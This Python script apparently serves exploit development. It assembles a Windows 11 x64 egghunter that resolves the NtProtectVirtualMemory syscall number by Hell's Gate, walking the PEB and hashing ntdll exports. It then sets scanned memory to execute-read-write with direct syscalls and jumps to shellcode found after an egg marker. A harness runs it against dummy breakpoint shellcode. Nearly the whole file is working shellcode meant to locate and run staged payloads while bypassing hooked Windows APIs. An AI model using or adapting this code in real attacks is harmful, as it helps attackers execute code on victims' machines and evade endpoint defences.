#!/usr/bin/python
#
# Windows 11 x64 Egghunter based on Hell's Gate and the NtProtectVirtualMemory system call
#
# Operation:
# First of all, the NtProtectVirtualMemory System Call Number is resolved using the Hell's Gate approach.
# This egghunter iterates the virtual memory addresses and, before searching for the egg, it performs a NtProtectVirtualMemory system call.
# This system call is similar to VirtualProtect, and is parameterized to set the memory to be scanned to READ, WRITE, EXECUTE.
# This way, when the egg is found, the shellcode after it is guaranteed to be executable.
#
# Resources:
# My Hell's Gate Assembly implementation was done thanks to the beautiful analysis of Milton Valencia in the following post:
# Ezekiel's Wheel: https://wetw0rk.github.io/posts/ezekielswheel/ezekielswheel

import socket
import sys
from struct import pack
from ctypes import *
from keystone import *

hg = (
'''
find_ntdll:
    xor rax, rax; 
    mov rax, gs:[rax + 0x60];                   # RAX = address of the PEB
    mov rax, [rax + 0x18];                      # RAX = address of _PEB_LDR_DATA
    mov rax, [rax + 0x20];                      # RAX = address of first _LIST_ENTRY of InMemoryOrderModuleList
    mov r8, rax;                                # R8 = address of current _LIST_ENTRY of InMemoryOrderModuleList

loop_next_list_entry:
    sub rax, 16;                                # RAX = address of the belonging _LDR_DATA_TABLE_ENTRY
    movzx cx, [rax + 0x58];                     # RCX = length of BaseDllName.Buffer in bytes (1 UNICODE char = 2 bytes)
    mov rsi, [rax + 0x58 + 8];                  # RSI = address of UNICODE string BaseDllName.Buffer
    mov r9, [rax + 0x30];                       # R9 = DllBase

compute_dll_name_hash:
    xor rax, rax;                               # EAX = 0
    cdq;                                        # If the MSB of EAX = 1: EDX = 0x11111111
                                                # If the MSB of EAX = 0: EDX = 0x00000000 -> fills EDX with the sign of EAX
                                                # In this case, EDX = 0x00000000 because EAX = 0x00000000

loop_compute_dll_name_hash:
    ror edx, 0xd;                               # Right-shift EDX of 13 bits
    add edx, eax;                               # EDX += current EAX value
    lodsb;                                      # Load the byte pointed by RSI into AL
    inc rsi;                                    # Discard the second byte of the UNICODE character (00)
    test al, al;                                # Test if the NULL terminator of the module name has been reached
    jnz loop_compute_dll_name_hash;             # If the NULL terminator has been reached (ZF = 1), proceed to hash comparison
                                                # Else, perform the next iteration of the hash-computation algorithm
                                                # At this point, EDX contains the computed hash of the current DLL name

    mov rax, [r8]                               # RAX = address of the next _LIST_ENTRY (current _LIST_ENTRY's Flink)
    cmp edx, 0xcef6e822;                        # Compare with Hash of "ntdll.dll"
    jnz loop_next_list_entry

calc_vma_ntdll_eat:
    xor rax, rax;
    mov eax, [r9 + 0x3c];                       # RAX = e_lfanew
    mov eax, [r9 + rax + 0x88];                 # EAX = RVA of ntdll's EAT
    add rax, r9;                                # RAX = VMA of ntdll's EAT
    
    xor rcx, rcx;
    xor rbp, rbp;
    xor rsi, rsi;
    xor r11, r11;
    xor rdi, rdi;
    mov ecx, [rax + 24];                        # ECX = Number Of Names -> will be used to index AddressOfNames
    mov ebp, [rax + 32];                        # EBP = RVA of AddressOfNames
    add rbp, r9;                                # RBP = VMA of AddressOfNames
    mov esi, [rax + 28];                        # ESI = RVA of AddressOfFunctions
    mov r11, rsi;
    add r11, r9;                                # R11 = VMA of AddressOfFunctions
    mov edi, [rax + 36];                        # EDI = RVA of AddressOfNameOrdinals
    add rdi, r9;                                # RDI = VMA of AddressOfNameOrdinals

loop_over_ntdll_names:
    xor rsi, rsi;
    dec ecx;                                    # Decrement the index for accessing AddressOfNames
    mov esi, [rbp + 4*rcx];                     # ESI = RVA of the (ECX + 1)-th name of ntdll
    add rsi, r9;                                # RSI = VMA of the (ECX + 1)-th name of ntdll
    
compute_symbol_hash:
    xor rax, rax;                               # EAX = 0
    cdq;

loop_compute_symbol_hash:
    ror edx, 0xd;                               # Right-shift EDX of 13 bits
    add edx, eax;                               # EDX += current EAX value
    lodsb;                                      # Load the byte pointed by RSI into AL
    test al, al;                                # Test if the NULL terminator of the symbol name has been reached
    jnz loop_compute_symbol_hash;               # If the NULL terminator has been reached (ZF = 1), proceed to hash comparison
                                                # Else, perform the next iteration of the hash-computation algorithm
                                                # At this point, EDX contains the computed hash of the current symbol
    cmp edx, 0x8c394d89                         # Hash of NtProtectVirtualMemory
    jnz loop_over_ntdll_names;

    mov cx, [rdi + 2*rcx];                      # RCX = ordinal
    xor rax, rax;
    mov eax, [r11 + 4*rcx];                     # EAX = AddressOfFunctions[ordinal] = RVA of NtProtectVirtualMemory
    add rax, r9;                                # RAX = VMA of NtProtectVirtualMemory

    dec rax;                                    # Position the pointer 1 byte before the start of function's code
loop_align_with_syscall_begin:                  # Find the beginning of the syscall: mov r10, rcx ; mov eax, <syscall number> ; 
    inc rax;
    mov rdx, [rax];                             # Read 8 bytes from the pointer
    cmp edx, 0xb8d18b4c;                        # Check whether the code at the pointer starts with "mov r10, rcx ; mov eax, <syscall number>"
    jnz loop_align_with_syscall_begin;
    shr rdx, 32;                                # EDX = 00 00 <syscall number (2 bytes)>
    ror edx, 16;                                # EDX = <syscall number (2 bytes)> 00 00
    cmp dx, 0x0000;
    jnz loop_align_with_syscall_begin;
    shr rdx, 16;                                # RDX = syscall number

'''
)

egghunter_x64_NtProtectVirtualMemory = (
    "start:                           "
    "   mov r15, rdx;                 " # R15 = syscall number of NtProtectVirtualMemory
    "   push 0x7F;                    " # RDI is nonvolatile, so it will be preserved after syscalls
    "   pop rdi;                      " # Start searching from address 0x7f + 1

    "setup:                           "
    "   inc rdi;                      " # Current Address = Parameter lpAddress of the syscall
    "   mov r9b, 0x40;                " # R9 = Parameter flNewProtect = 0x40 = PAGE_EXECUTE_READWRITE
    "   pop rsi;                      " # Stack alignment before setup
    "   pop rsi;                      "
    "   push rdi;                     " # Push lpAddress = Current Address onto the stack
    "   push rsp;                     "
    "   pop rdx;                      " # RDX = address of lpAddress
    "   push 16;                      " # Push dwSize = 16 onto the stack
    "   push rsp;                     " 
    "   pop r8;                       " # R8 = address of dwSize
    "   mov [rdx+0x20], rsp;          " # Parameter lpflOldProtect (output). Note: this parameter is on the stack!
                                        # Parameters in the x64 Syscall calling convention: R10, RDX, R8, R9, stack
    "   dec r10;                      " # Paramter hProcess = -1 = Current Process. At this point R10 is always = 0.

    "NtProtectVirtualMemory:          "
    "   push r15;                     " # Syscall Number of NtProtectVirtualMemory resolved with Hell's Gate
    "   pop rax;                      " # RAX = Syscall Number
    "   syscall;                      " # Issue the system call
    "   cmp al, 0x01;                 " # Examine the return value of the system call
    "   jge setup;                    " # retry if needed

    "scan:                            "
    "   mov eax, 0x62303062;          " # Egg marker = b00b
    "   scasd;                        " # Scan for first half of egg
    "   jnz setup;                    " # If not found, continue scanning
    "   scasd;                        " # Scan for second half of egg
    "   jnz setup;                    " # If not found, continue scanning
    "   jmp rdi;                      " # Jump to shellcode when egg is found
)

ks = Ks(KS_ARCH_X86, KS_MODE_64)

# Generation of syscall-based Egghunter
egghunter_x64_hells_gate = hg + egghunter_x64_NtProtectVirtualMemory

encoding, count = ks.asm(egghunter_x64_hells_gate)
egghunter_hexstr = ""
for dec in encoding: 
  egghunter_hexstr += "\\x{0:02x}".format(int(dec)).rstrip("\n")
print(f"Egghunter (NtProtectVirtualMemory): {egghunter_hexstr}")

sh = b""
for e in encoding:
    sh += pack("B", e)
egghunter = bytearray(sh)

# Allocate and copy a dummy shellcode (not yet executable!) with the egg in front of it
shellcode = b"b00bb00b" + b"\xcc" * 100
memory_shellcode = windll.kernel32.VirtualAlloc(0x20000000, len(shellcode), 0x3000, 0x4)  # MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
print(f"Allocated {len(shellcode)} bytes of shellcode memory at {c_uint64(memory_shellcode).value:#018x}")
buf = (c_char * len(shellcode)).from_buffer_copy(shellcode)
windll.kernel32.RtlMoveMemory(memory_shellcode, buf, len(shellcode))

# Allocate executable memory for the egghunter
memory_egghunter = windll.kernel32.VirtualAlloc(0x10000000, len(egghunter), 0x3000, 0x40)  # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE

if not memory_egghunter:
    raise RuntimeError("VirtualAlloc failed!")

print(f"Allocated {len(egghunter)} bytes of egghunter memory at {c_uint64(memory_egghunter).value:#018x}")

# Copy shellcode in the allocated read/write memory (not yet executable!)
buf = (c_char * len(egghunter)).from_buffer_copy(egghunter)
windll.kernel32.RtlMoveMemory(memory_egghunter, buf, len(egghunter))

input("\n[?] Press Enter to execute the egghunter: ")

# Execute the egghunter in a new thread. The egghunter searches for the egg and sets memory to PAGE_EXECUTE_READWRITE
ht = windll.kernel32.CreateThread(
    None, 0, c_void_p(memory_egghunter), None, 0, pointer(c_int(0))
)

if not ht:
    raise RuntimeError("CreateThread failed!")

# Wait for thread termination
windll.kernel32.WaitForSingleObject(ht, -1)